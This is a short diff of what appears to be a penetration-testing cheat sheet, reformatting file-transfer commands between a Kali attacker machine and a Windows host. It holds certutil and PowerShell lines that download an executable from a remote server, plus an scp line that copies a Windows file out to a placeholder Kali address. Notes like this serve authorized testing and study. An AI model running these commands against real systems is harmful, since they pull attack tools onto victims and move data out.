@@ -30,15 +30,21 @@ download /path/to/remote/file
 
 {% tabs %}
 {% tab title="certutil" %}
-`certutil -urlcache -f http:///file.exe file.exe`
+```bash
+certutil -f -urlcache http://server/file.exe file.exe
+```
 {% endtab %}
 
 {% tab title="powershell" %}
-`iwr -uri http://<kali-ip>/file.exe -Outfile file.exe`
+```powershell
+iwr -uri http://server/file.exe -outfile C:\file.exe
+```
 {% endtab %}
 
 {% tab title="ssh (windows -> kali)" %}
-`scp windows-file.txt parallels@<kali-ip>:/path/to/store`
+```bash
+scp windows-file.txt parallels@<kali-ip>:/path/to/store
+```
 {% endtab %}
 {% endtabs %}
 
